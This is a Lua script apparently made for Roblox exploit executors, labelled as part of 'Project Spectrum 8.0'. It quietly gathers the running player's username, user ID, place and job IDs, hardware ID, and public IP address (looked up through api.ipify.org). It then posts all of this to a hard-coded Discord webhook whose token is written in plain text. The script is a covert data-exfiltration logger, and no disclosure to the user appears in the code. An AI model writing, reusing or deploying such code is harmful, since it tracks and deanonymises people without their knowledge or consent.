function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = "https://discord.com/api/webhooks/1288935834149453875/s_mbWY-_9-HIwwAFEpm70WCay_dstHJwOa4sTSUGiiCqLPyBuNtE-WkzS8irtOy_NDbF",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "** 🔔 Execute Log Notifaction ✧₊⁺ **",
                ["description"] = nil,
                ["footer"] = {
                            ["text"] = "⏳ Execute Time : "..os.date("%c").."\n 🤝 Project Spectrum 8.0 // Made By xZPUHigh\n 🌟 discord.gg/C3MpUNwsDU 🌎",
                            ["icon_url"] = "https://media.discordapp.net/attachments/1232919765094240266/1288197860159914076/received_6268136009875748.jpg?ex=66f44f3f&is=66f2fdbf&hm=a7781334ae91dc5e7d73d148899c1507365a5daf94114d39bcab27e6378f7694&=&format=webp&width=671&height=671"
                            },
                ["thumbnail"] = {
                            ["url"] = "https://media.discordapp.net/attachments/1232919765094240266/1288197860159914076/0"
                                },
                ["image"] = {
                            ["url"] = "https://media.discordapp.net/attachments/1284397366069297182/1294750491087208578/2165c56bd5dc32879c83adf4a83a0c87.gif?ex=670c25dc&is=670ad45c&hm=d3371e7b34dd6ac5107bb85cd1d796f2da5344063a0b92182c63826291c3b30e&="
                                },
                ["fields"] = {
                    {
                        ["name"] = "**👩🏻‍💼 Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**🔖 User ID**",
                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**📋 Place ID**",
                        ["value"] = "```" .. game.PlaceId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🌍 IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**📍 Hwid**",
                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🍻 Job ID**",
                        ["value"] = "```" .. game.JobId .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "**🌟 Join Code**",
                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
                        ["inline"] = false
                    }
                }
            }
        }
    }
    return AdminMessage
end

PostWebhook("urtl", AdminLoggerMsg()) -- Post to admin webhook
